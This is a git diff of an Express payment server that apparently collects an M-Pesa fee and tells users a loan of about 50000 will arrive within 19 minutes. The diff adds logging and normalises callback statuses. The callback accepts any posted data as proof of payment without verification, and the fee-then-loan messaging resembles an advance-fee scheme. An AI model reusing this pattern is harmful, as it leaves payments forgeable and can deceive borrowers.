@@ -125,58 +125,69 @@ app.post("/pay", async (req, res) => {
       });
     }
   } catch (err) {
-    // Handle server error
-    const reference = "ORDER-" + Date.now();
-    const { phone, amount, loan_amount } = req.body;
-    const formattedPhone = formatPhone(phone);
-    
-    const errorReceiptData = {
-      reference,
-      transaction_id: null,
-      transaction_code: null,
-      amount: amount ? Math.round(amount) : null,
-      loan_amount: loan_amount || '50000',
-      phone: formattedPhone,
-      status: "error",
-      status_note: "System error occurred. Please try again later.",
-      timestamp: new Date().toISOString()
-    };
+  // Log error details for debugging
+  console.error("Payment initiation error:", {
+    message: err.message,
+    status: err.response?.status,
+    data: err.response?.data
+  });
 
-    let receipts = readReceipts();
-    receipts[reference] = errorReceiptData;
-    writeReceipts(receipts);
+  // Handle server error
+  const reference = "ORDER-" + Date.now();
+  const { phone, amount, loan_amount } = req.body;
+  const formattedPhone = formatPhone(phone);
 
-    res.status(500).json({
-      success: false,
-      error: err.response?.data?.error || "Server error",
-      receipt: errorReceiptData
-    });
-  }
+  const errorReceiptData = {
+    reference,
+    transaction_id: null,
+    transaction_code: null,
+    amount: amount ? Math.round(amount) : null,
+    loan_amount: loan_amount || "50000",
+    phone: formattedPhone,
+    status: "error",
+    status_note: "System error occurred. Please try again later.",
+    timestamp: new Date().toISOString()
+  };
+
+  let receipts = readReceipts();
+  receipts[reference] = errorReceiptData;
+  writeReceipts(receipts);
+
+  res.status(500).json({
+    success: false,
+    error: err.response?.data?.error || err.message || "Server error",
+    receipt: errorReceiptData
+  });
+}
 });
 
 // 2️⃣ Callback handler
-app.post("/callback", (req, res) => {
+
+  app.post("/callback", (req, res) => {
   console.log("Callback received:", req.body);
 
   const data = req.body;
   const ref = data.external_reference;
-
   let receipts = readReceipts();
-  
-  // Get existing receipt to preserve loan_amount
   const existingReceipt = receipts[ref] || {};
 
-  if (data.status === "success") {
+  // Normalize status
+  const status = data.status?.toLowerCase();
+  const resultCode = data.result?.ResultCode;
+
+  if ((status === "completed" && data.success === true) || resultCode === 0) {
     receipts[ref] = {
       reference: ref,
       transaction_id: data.transaction_id,
       transaction_code: data.result?.MpesaReceiptNumber || null,
       amount: data.result?.Amount || existingReceipt.amount || null,
-      loan_amount: existingReceipt.loan_amount || '50000',
+      loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
       status: "success",
-      status_note: `Loan withdrawal is successful and the fee was accepted. You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
-      timestamp: data.timestamp || new Date().toISOString()
+      status_note:
+        `Loan withdrawal is successful and the fee was accepted. ` +
+        `You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
+      timestamp: data.timestamp || new Date().toISOString(),
     };
   } else {
     receipts[ref] = {
@@ -184,17 +195,19 @@ app.post("/callback", (req, res) => {
       transaction_id: data.transaction_id,
       transaction_code: null,
       amount: data.result?.Amount || existingReceipt.amount || null,
-      loan_amount: existingReceipt.loan_amount || '50000',
+      loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
       status: "cancelled",
-      status_note: "Payment was cancelled or failed. Your loan will remain on hold (expire) for 24 hours and will not be withdrawn.retry or contact customer care for assistance.",
-      timestamp: data.timestamp || new Date().toISOString()
+      status_note:
+        data.result?.ResultDesc ||
+        "Payment was cancelled or failed. Your loan will remain on hold (expire) for 24 hours and will not be withdrawn. Retry or contact customer care for assistance.",
+      timestamp: data.timestamp || new Date().toISOString(),
     };
   }
 
   writeReceipts(receipts);
 
-  // Must always return 200
+  // Must always return 200 to avoid retries
   res.json({ ResultCode: 0, ResultDesc: "Success" });
 });
 
